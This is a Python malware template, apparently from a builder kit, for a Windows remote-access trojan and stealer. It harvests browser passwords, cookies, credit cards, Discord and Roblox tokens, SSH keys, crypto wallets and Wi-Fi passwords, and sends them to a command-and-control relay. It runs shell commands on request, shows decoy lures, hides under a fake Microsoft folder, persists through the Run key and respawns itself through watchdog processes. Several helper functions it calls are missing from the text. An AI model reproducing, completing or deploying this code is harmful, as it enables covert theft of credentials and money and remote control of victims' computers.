# payload/template.py (Full Code - Unified Main/Guardian Logic)
import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, random, traceback
from datetime import datetime, timezone, timedelta
import sqlite3
import xml.etree.ElementTree as ET

# --- Optional Imports for Harvesting & Functionality ---
try: from mss import mss
except ImportError: mss = None
try: import win32crypt
except ImportError: win32crypt = None
try: import winreg
except ImportError: winreg = None
try: import psutil
except ImportError: psutil = None
try: import ctypes
except ImportError: ctypes = None
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError: AESGCM = None
try: import win32cred
except ImportError: win32cred = None

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
SESSION_ID = str(uuid.uuid4())
STEALTH_MODE = {{STEALTH_MODE}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
END_TASK_POPUP_ENABLED = {{END_TASK_POPUP_ENABLED}}
END_TASK_POPUP_TITLE = {{END_TASK_POPUP_TITLE}}
END_TASK_POPUP_MESSAGE = {{END_TASK_POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}
HYDRA_ENABLED = {{HYDRA_ENABLED}}
HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}
EMBEDDED_GUARDIANS = {{EMBEDDED_GUARDIANS}}

results_to_send, results_lock = [], threading.Lock()
TERMINATE_FLAG = threading.Event()

# --- Utility Functions ---
def send_result(command_name, output_data, status="success"):
    with results_lock:
        results_to_send.append({"command": command_name, "output": {"status": status, "data": output_data}})

def _run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=20, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, errors='ignore')
        return result.stdout.strip()
    except: return ""

def _get_appdata_paths():
    base = os.path.expanduser("~")
    return { "local": os.path.join(base, "AppData", "Local"), "roaming": os.path.join(base, "AppData", "Roaming"), "user": base }

# --- Core C2 Actions ---
def _perform_total_annihilation(stealth_dir):
    TERMINATE_FLAG.set()
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                for name in HYDRA_GUARDIANS:
                    try: winreg.DeleteValue(reg_key, name)
                    except FileNotFoundError: pass
        except Exception: pass
    cleanup_script_path = os.path.join(os.environ["TEMP"], f"cleanup_{uuid.uuid4().hex}.bat")
    with open(cleanup_script_path, "w") as f:
        f.write("@echo off\n")
        f.write("timeout /t 3 /nobreak > NUL\n")
        f.write(f'if exist "{stealth_dir}" ( rd /s /q "{stealth_dir}" )\n')
        f.write(f'(goto) 2>nul & del "%~f0"\n')
    subprocess.Popen([cleanup_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
    if psutil:
        my_pid = os.getpid()
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in HYDRA_GUARDIANS and proc.info['pid'] != my_pid:
                try: proc.terminate()
                except: pass
    sys.exit(0)

def _create_annihilation_packet(params):
    try:
        stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP')), 'Microsoft', 'SystemCache')
        annihilation_file = os.path.join(stealth_dir, "annihilate.pill")
        with open(annihilation_file, 'w') as f: f.write('terminate')
        return {"status": "success", "data": "Annihilation packet delivered."}
    except Exception as e:
        return {"status": "error", "data": f"Failed to deliver packet: {e}"}

_action_self_destruct = _create_annihilation_packet

def harvest_system_info():
    try:
        uname = platform.uname(); ip = "N/A"
        try: ip = requests.get('https://api.ipify.org', timeout=10, verify=True).text
        except: pass
        data = { "hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{uname.system} {uname.release}", "ip": ip, "arch": uname.machine }
        return {"status": "success", "data": data}
    except Exception: return {"status": "error", "data": {"hostname": socket.gethostname(), "user": getpass.getuser()}}

def _action_popup(params):
    if ctypes and hasattr(ctypes.windll, 'user32'):
        ctypes.windll.user32.MessageBoxW(0, params.get('message', 'Hello!'), params.get('title', 'Message'), 0)
    return {"status": "success", "data": "Popup displayed."}

def _action_shell(params):
    command = params.get("command", "")
    if not command: return {"status": "error", "data": "No command provided."}
    return {"status": "success", "data": _run_command(command)}

def _action_screenshot(params):
    if not mss: return {"status": "error", "data": "MSS library not available."}
    try:
        with mss() as sct:
            temp_path = os.path.join(os.environ["TEMP"], f'ss_{SESSION_ID}.png')
            sct.shot(output=temp_path)
            with open(temp_path, "rb") as f: img_b64 = base64.b64encode(f.read()).decode()
            os.remove(temp_path)
            return {"status": "success", "data": img_b64}
    except Exception as e: return {"status": "error", "data": str(e)}

def _action_pslist(params):
    return {"status": "success", "data": _get_running_processes()}

def perform_initial_harvest():
    # This function now simply calls the individual harvest functions
    # which will send results one-by-one
    appdata = _get_appdata_paths()
    all_harvest_functions = {
        "os_info": _get_os_info, "hardware_info": _get_hardware_info,
        "security_products": _get_security_products, "installed_apps": _get_installed_apps,
        "running_processes": _get_running_processes, "env_variables": lambda: dict(os.environ),
        "network_info": _get_network_info, "wifi_passwords": _get_wifi_passwords,
        "active_connections": lambda: _run_command("netstat -an"),
        "arp_table": lambda: _run_command("arp -a"), "dns_cache": lambda: _run_command("ipconfig /displaydns"),
        "discord_tokens": lambda: _get_discord_tokens(appdata), "windows_vault": _get_windows_vault,
        "filezilla": lambda: _get_filezilla_credentials(appdata), "telegram": lambda: _get_telegram_session(appdata),
        "ssh_keys": lambda: _get_ssh_keys(appdata), "crypto_wallets": lambda: _search_for_crypto_wallets(appdata),
        "clipboard": _get_clipboard
    }

    for name, func in all_harvest_functions.items():
        try:
            result = func()
            send_result(name, result)
        except Exception:
            send_result(name, f"Error harvesting {name}", status="error")
        time.sleep(0.1)

    try:
        passwords, cookies, history, autofill, cards, roblox_cookies = _get_browser_data(appdata)
        send_result("browser_passwords", passwords)
        send_result("session_cookies", cookies)
        send_result("browser_history", history)
        send_result("browser_autofill", autofill)
        send_result("credit_cards", cards)
        send_result("roblox_cookies", roblox_cookies)
    except Exception as e:
        send_result("browser_passwords", f"Error harvesting browser data: {e}", status="error")


def execute_command(command_data):
    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)
    result = {"status": "error", "data": f"Unsupported action: {action}"}
    if callable(handler_func):
        try: result = handler_func(params)
        except Exception as e: result = {"status": "error", "data": f"Handler failed: {e}"}
    if response_id:
        try:
            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=True)
        except requests.exceptions.RequestException: pass

def command_and_control_loop(initial_metadata):
    while not TERMINATE_FLAG.is_set():
        try:
            with results_lock:
                outgoing_results = results_to_send[:]; results_to_send.clear()
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, "results": outgoing_results, "hostname": initial_metadata.get("hostname"), "user": initial_metadata.get("user"), "os": initial_metadata.get("os")}
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=True)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except requests.exceptions.RequestException: pass
        time.sleep(random.randint(8, 15))

def hydra_watchdog(home_dir):
    if not psutil: return
    guardian_names = HYDRA_GUARDIANS
    my_name = os.path.basename(sys.executable)
    heal_lock_file = os.path.join(os.environ["TEMP"], "tether_heal.lock")
    annihilation_file = os.path.join(home_dir, "annihilate.pill")
    while not TERMINATE_FLAG.is_set():
        if os.path.exists(annihilation_file):
            _perform_total_annihilation(home_dir); break
        try:
            running_procs = {p.info['name'] for p in psutil.process_iter(['name'])}
            missing_guardians = set(guardian_names) - running_procs
            if missing_guardians:
                lock_acquired = False
                try:
                    if os.path.exists(heal_lock_file):
                        if (time.time() - os.path.getmtime(heal_lock_file)) > 15: os.remove(heal_lock_file)
                        else: time.sleep(10); continue
                    with open(heal_lock_file, 'w') as f: f.write(str(time.time())); lock_acquired = True
                    if END_TASK_POPUP_ENABLED: _action_popup({"title": END_TASK_POPUP_TITLE or "Critical Process Failure", "message": END_TASK_POPUP_MESSAGE or "A required system process has been terminated..."})
                    for guardian_name in missing_guardians:
                        guardian_path = os.path.join(home_dir, guardian_name)
                        if os.path.exists(guardian_path): subprocess.Popen([guardian_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
                finally:
                    if lock_acquired and os.path.exists(heal_lock_file): os.remove(heal_lock_file)
        except Exception: pass
        time.sleep(10)

def initial_lure():
    if POPUP_ENABLED: _action_popup({"title": POPUP_TITLE, "message": POPUP_MESSAGE})
    if DECOY_ENABLED:
        try:
            decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
            with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
            os.startfile(decoy_path)
        except: pass

def install_persistence(stealth_dir):
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                for name in HYDRA_GUARDIANS:
                     winreg.SetValueEx(reg_key, os.path.splitext(name)[0], 0, winreg.REG_SZ, os.path.join(stealth_dir, name))
        except: pass

def migrate_and_spawn(stealth_dir):
    try:
        os.makedirs(stealth_dir, exist_ok=True)
        my_name = os.path.basename(sys.executable); my_path = os.path.abspath(sys.executable)
        
        migrator_script_path = os.path.join(os.environ["TEMP"], f"migrate_{uuid.uuid4().hex}.bat")
        with open(migrator_script_path, "w") as f:
            f.write("@echo off\n")
            f.write("ping 127.0.0.1 -n 6 > nul\n") # More reliable wait
            for filename, b64_data in EMBEDDED_GUARDIANS.items():
                new_path = os.path.join(stealth_dir, filename)
                f.write(f'move /Y "{my_path}" "{new_path}"\n')
                f.write(f'if exist "{new_path}" (\n')
                f.write(f'    start "" "{new_path}"\n')
                f.write(f')\n')
                break # Only need to move the main payload once
            f.write(f'(goto) 2>nul & del "%~f0"\n')

        subprocess.Popen([migrator_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
        sys.exit(0)
    except: sys.exit(1)


def spawn_guardians(stealth_dir):
    if EMBEDDED_GUARDIANS:
        for filename, b64_data in EMBEDDED_GUARDIANS.items():
            if filename == os.path.basename(sys.executable): continue # Don't respawn self
            try:
                file_path = os.path.join(stealth_dir, filename)
                if not os.path.exists(file_path):
                    with open(file_path, 'wb') as f: f.write(base64.b64decode(b64_data))
                subprocess.Popen([file_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            except: pass

if __name__ == "__main__":
    stealth_dir = os.path.join(os.environ.get('LOCALAPPDATA', os.environ.get('TEMP')), 'Microsoft', 'SystemCache')
    my_current_path = os.path.dirname(os.path.abspath(sys.executable))
    
    # --- FIX: The core logic fix is here. Migration only happens if not already in the stealth dir. ---
    if my_current_path.lower() != stealth_dir.lower() and hasattr(sys, 'frozen'):
        initial_lure()
        migrate_and_spawn(stealth_dir)
    else:
        # Flag file now indicates that this specific process has completed its first-run tasks
        flag_file = os.path.join(stealth_dir, f"flag_{os.path.basename(sys.executable)}.flg")
        is_first_run_for_this_process = not os.path.exists(flag_file)

        if is_first_run_for_this_process:
            if HYDRA_ENABLED:
                spawn_guardians(stealth_dir)
                install_persistence(stealth_dir)
            threading.Thread(target=perform_initial_harvest, daemon=True).start()
            try:
                with open(flag_file, 'w') as f: f.write('done')
            except: pass
        else:
            now = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
            send_result("Agent Event", f"[{now}] Payload instance (re)started or revived.")

        initial_info = harvest_system_info()
        initial_metadata = initial_info.get("data", {})
        c2_thread = threading.Thread(target=command_and_control_loop, args=(initial_metadata,), daemon=True)
        c2_thread.start()

        if HYDRA_ENABLED:
            watchdog_thread = threading.Thread(target=hydra_watchdog, args=(stealth_dir,), daemon=True)
            watchdog_thread.start()
            
        TERMINATE_FLAG.wait()